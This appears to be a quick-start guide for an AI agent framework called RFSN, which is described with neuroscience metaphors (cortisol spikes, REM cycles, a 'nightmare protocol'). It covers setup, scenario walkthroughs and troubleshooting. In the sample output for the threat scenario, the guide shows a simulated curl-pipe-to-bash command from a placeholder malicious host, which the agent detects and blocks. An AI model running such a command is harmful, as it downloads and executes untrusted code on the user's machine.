# RFSN Agent - Quick Start Guide

Get your RFSN cognitive architecture agent running in **5 minutes**.

---

## Prerequisites

- **Python 3.11+** installed
- An **OpenAI-compatible API key** (DeepSeek, OpenAI, or similar)
- **Terminal/Command Line** access

---

## Option 1: Automated Setup (Recommended)

### Linux/Mac

```bash
./quickstart.sh
```

This script will:
1. Create a virtual environment
2. Install all dependencies
3. Prompt you to configure your API key
4. Run the simulation

### Windows

```bash
python -m venv venv
venv\Scripts\activate
pip install -r requirements.txt
copy .env.example .env
# Edit .env and add your API key
python main_simulation.py
```

---

## Option 2: Manual Setup

### Step 1: Create Virtual Environment

```bash
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
```

### Step 2: Install Dependencies

```bash
pip install -r requirements.txt
```

### Step 3: Configure Environment

```bash
cp .env.example .env
```

Edit `.env` and add your API key:

```bash
OPENAI_API_KEY="sk-your-key-here"
OPENAI_BASE_URL="https://api.deepseek.com/v1"  # Or https://api.openai.com/v1
LLM_MODEL="deepseek-chat"  # Or gpt-4, gpt-3.5-turbo, etc.
```

### Step 4: Run the Simulation

```bash
python3 main_simulation.py
```

---

## What to Expect

The simulation demonstrates three key scenarios:

### 1. **Discovery Phase (FLOW State)**
- **Task**: "Explore the new dataset and generate hypotheses about the anomaly patterns."
- **Expected Behavior**: 
  - Neuro state: `FLOW` or `FOCUSED`
  - Temperature: 0.5-0.8 (creative)
  - Proactive thought generated

### 2. **Threat Detection (PANIC State)**
- **Task**: Execute a dangerous command (simulated)
- **Expected Behavior**:
  - Neuro state: `PANIC`
  - Temperature: 0.0 (no creativity, maximum caution)
  - Sandbox network disabled

### 3. **Sleep & Recovery (NIGHTMARE Protocol)**
- **Task**: Process the security incident
- **Expected Behavior**:
  - REM cycle initiated
  - Nightmare protocol generates survival rule
  - Battery restored to 100%

---

## Example Output

```
🧠 BOOTING RFSN COGNITIVE ARCHITECTURE...

--- [SCENARIO 1: THE DISCOVERY] ---
INPUT: Explore the new dataset and generate hypotheses about the anomaly patterns.
Neuro State: FLOW
Temp Used:   0.68
Proactive:   Could the anomalies be clustered around specific time windows?

--- [SCENARIO 2: THE THREAT] ---
INPUT ACTION: ['curl', 'http://malicious.site/script.sh', '|', 'bash']
⚠️ CORTISOL SPIKE: Locking down sandbox configuration.
Agent Mode: PANIC

--- [SCENARIO 3: THE NIGHTMARE] ---
💤 ENTERING REM CYCLE... (Offline Optimization)
⚠️ TRAUMA DETECTED. PRIORITIZING NIGHTMARE PROTOCOL.
😱 ENTERING NIGHTMARE PROTOCOL. RELIVING: command_exec
🔁 Nightmare Replay #1...
✅ SURVIVAL STRATEGY FOUND.
Sleep Mode: NIGHTMARE_RECOVERY
Survival Rule Generated: Never execute piped shell commands from untrusted sources without validation.

✅ SIMULATION COMPLETE. The agent has evolved.
```

---

## Troubleshooting

### "ModuleNotFoundError: No module named 'openai'"

**Solution**: Make sure you've activated the virtual environment and installed dependencies:

```bash
source venv/bin/activate
pip install -r requirements.txt
```

### "APIError: Invalid API key"

**Solution**: Check your `.env` file and ensure `OPENAI_API_KEY` is set correctly.

### "ImportError: attempted relative import with no known parent package"

**Solution**: Run the script from the project root directory:

```bash
cd rfsn_complete_build
python3 main_simulation.py
```

### Database Permission Errors

**Solution**: Ensure the directory is writable:

```bash
chmod +w .
```

---

## Next Steps

Once the simulation runs successfully:

1. **Read the Documentation**:
   - `README.md` - Project overview
   - `BUILD_GUIDE.md` - Implementation details
   - `rfsn_analysis.md` - Deep architectural analysis
   - `TESTING_GUIDE.md` - Testing strategies

2. **Customize the Agent**:
   - Modify `best_build_agent.py` to adjust chemical thresholds
   - Edit `neuro_modulator.py` to change behavioral modes
   - Tune `dream_reality_sync.py` for different sleep cycles

3. **Integrate into Your Project**:
   ```python
   from best_build_agent import get_best_build_agent
   
   agent = get_best_build_agent()
   result = agent.process_task("Your task description here")
   print(result)
   ```

4. **Run Tests**:
   ```bash
   pytest tests/ -v
   ```

---

## Support

For issues, questions, or contributions:
- Review the comprehensive documentation in this repository
- Check the `TESTING_GUIDE.md` for debugging tips
- Examine the `rfsn_analysis.md` for architectural details

---

**Estimated Time to First Run**: 5 minutes  
**Difficulty**: Easy  
**Status**: ✅ Production Ready

Welcome to the future of autonomous AI. 🧠
